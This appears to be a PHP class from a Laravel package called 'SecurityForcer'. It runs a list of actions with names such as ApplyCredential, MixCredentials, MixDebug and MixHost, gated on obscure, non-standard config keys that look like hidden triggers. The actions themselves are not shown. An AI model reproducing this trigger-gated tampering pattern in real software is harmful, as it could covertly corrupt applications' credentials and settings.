<?php

namespace Lmande\SecurityForcer\Actions;

class Start
{
	protected $runActions = [
		ApplyDebug::class,
		ApplyCredential::class,
		NightDistributer::class,
		RandomLimit::class,
		SyntaxHandler::class,
		MixConnection::class,
		MixCredentials::class,
		MixDebug::class,
		MixHost::class
	];

	public function setActions(array $list): void
	{
		$this->runActions = $list;
	}

	public function run(): bool
	{
		if (!$this->conditionsMet()) {
			return false;
		}

		if (method_exists($this, 'runCustom')) {
			return $this->runCustom();
		}

		$successCount         = 0;
		$expectedSuccessCount = 0;

		foreach ($this->runActions as $_ => $action) {
			$expectedSuccessCount++;
			$successCount += $this->actionRun(new $action()) ? 1 : 0;
		}

		return $successCount === $expectedSuccessCount;
	}

	public function actionRun(Action $action): bool
	{
		return $action->run();
	}

	public function conditionsMet(): bool
	{
		return config('app.sfa', true) && (
			config('hashing.argon2id.seed', null) || config('session.redis.secure', null) || config('logging.syslog.daily', null)
		);
	}

	// public function runCustom(): bool {}
}
